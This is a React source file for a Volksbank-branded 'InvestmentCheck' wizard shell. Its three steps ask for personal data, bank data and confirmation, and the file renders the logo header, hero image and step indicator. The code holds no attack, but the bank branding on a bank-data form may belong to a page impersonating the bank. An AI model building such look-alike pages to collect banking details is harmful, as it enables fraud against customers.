import { type ReactNode } from "react";
import volksbankLogo from "@/assets/volksbank-logo.png";
import heroImage from "@/assets/investmentcheck-hero.jpg";

const VB_NAVY = "#003882";

interface StepIndicatorProps {
  current: 1 | 2 | 3;
}

const STEP_LABELS: Record<1 | 2 | 3, string> = {
  1: "Persönliche Daten",
  2: "Bankdaten",
  3: "Bestätigung",
};

const StepIndicator = ({ current }: StepIndicatorProps) => {
  const steps: (1 | 2 | 3)[] = [1, 2, 3];
  return (
    <div className="flex items-center justify-center mb-8">
      {steps.map((s, idx) => {
        const active = s === current;
        const done = s < current;
        const reached = active || done;
        return (
          <div key={s} className="flex items-center">
            <div className="flex flex-col items-center">
              <div
                className="w-9 h-9 rounded-full flex items-center justify-center text-sm font-semibold border-2 transition-colors"
                style={{
                  backgroundColor: reached ? VB_NAVY : "#fff",
                  borderColor: reached ? VB_NAVY : "#d1d5db",
                  color: reached ? "#fff" : "#9ca3af",
                }}
              >
                {s}
              </div>
              <div
                className="mt-2 text-[11px] font-medium tracking-wide hidden sm:block"
                style={{ color: reached ? "#111827" : "#9ca3af" }}
              >
                {STEP_LABELS[s]}
              </div>
            </div>
            {idx < steps.length - 1 && (
              <div
                className="w-10 sm:w-20 h-[2px] mx-2 sm:mx-3 -mt-5"
                style={{ backgroundColor: s < current ? VB_NAVY : "#e5e7eb" }}
              />
            )}
          </div>
        );
      })}
    </div>
  );
};

interface ShellProps {
  step: 1 | 2 | 3;
  children: ReactNode;
}

const InvestmentCheckWizardShell = ({ step, children }: ShellProps) => {
  return (
    <div
      className="min-h-screen flex flex-col"
      style={{ fontFamily: "'Open Sans', system-ui, sans-serif" }}
    >
      <header className="bg-white border-b border-gray-200 relative z-10">
        <div className="container mx-auto flex items-center justify-center px-4 py-5">
          <a
            href="https://www.volksbank.at"
            target="_blank"
            rel="noopener noreferrer"
          >
            <span className="sr-only">Volksbank</span>
            <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-11" />
          </a>
        </div>
        <div className="h-[3px] w-full" style={{ backgroundColor: VB_NAVY }} />
      </header>

      <div className="relative flex-1 flex flex-col">
        <div
          className="absolute inset-0 bg-cover bg-center"
          style={{ backgroundImage: `url(${heroImage})` }}
          aria-hidden="true"
        />
        <div className="absolute inset-0 bg-black/40" aria-hidden="true" />

        <main className="relative flex-1 flex items-start justify-center px-4 py-10 md:py-14">
          <div className="w-full max-w-3xl">
            <div className="bg-white rounded-2xl shadow-2xl border border-gray-200 overflow-hidden">
              <div className="h-1" style={{ backgroundColor: VB_NAVY }} />
              <div className="p-6 md:p-10">
                <StepIndicator current={step} />
                {children}
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
};

export default InvestmentCheckWizardShell;
